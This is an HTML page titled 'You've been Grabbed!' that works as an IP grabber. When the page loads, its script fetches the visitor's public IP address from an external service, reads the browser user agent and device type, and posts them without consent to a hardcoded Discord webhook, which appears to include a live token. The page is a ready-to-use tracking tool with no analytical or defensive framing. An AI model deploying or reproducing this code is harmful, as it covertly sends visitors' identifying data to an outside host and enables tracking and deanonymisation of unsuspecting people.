<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You've been Grabbed!</title>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            font-size: 4em;
            text-shadow: 2px 2px 8px #ff0000, 0 0 10px #ff0000, 0 0 20px #8b0000;
            animation: flicker 1.5s infinite alternate;
        }
        @keyframes flicker {
            0% {
                opacity: 1;
                text-shadow: 2px 2px 8px #ff0000, 0 0 10px #ff0000, 0 0 20px #8b0000;
            }
            50% {
                opacity: 0.7;
                text-shadow: 2px 2px 12px #ff3333, 0 0 12px #ff3333, 0 0 30px #b30000;
            }
            100% {
                opacity: 0.9;
                text-shadow: 2px 2px 15px #ff6666, 0 0 15px #ff6666, 0 0 40px #e60000;
            }
        }
    </style>
</head>
<body>
    <h1>You've been Grabbed!</h1>

    <script>
        // Replace with your Discord webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1325168587882889257/1zJNbweNL690W_KESw1xIWrHqaT8hy_Z0jmnRpPwZlQOvxG6b2L7yqJrC5Ug1HEgYmk4";

        // Fetch user IP from an external service
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIP = data.ip; // User's IP address
                const userBrowser = navigator.userAgent; // User's browser details

                // Detect user device type
                let userDevice = 'Desktop';
                if (/mobile/i.test(userBrowser)) {
                    userDevice = 'Mobile';
                } else if (/tablet/i.test(userBrowser)) {
                    userDevice = 'Tablet';
                }

                // Prepare the data to send to Discord
                const webhookData = {
                    content: `\`📡\` IP: ${userIP}\n\`🌐\` Browser: ${userBrowser}\n\`🖥️\` Device: ${userDevice}`
                };

                // Send data to the Discord webhook
                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                })
                    .then(response => {
                        if (response.ok) {
                            console.log('Message sent to Discord webhook successfully.');
                        } else {
                            console.error('Failed to send message to Discord webhook.', response);
                        }
                    })
                    .catch(error => console.error('Error sending message to Discord webhook:', error));
            })
            .catch(error => console.error('Error fetching IP address:', error));
    </script>
</body>
</html>
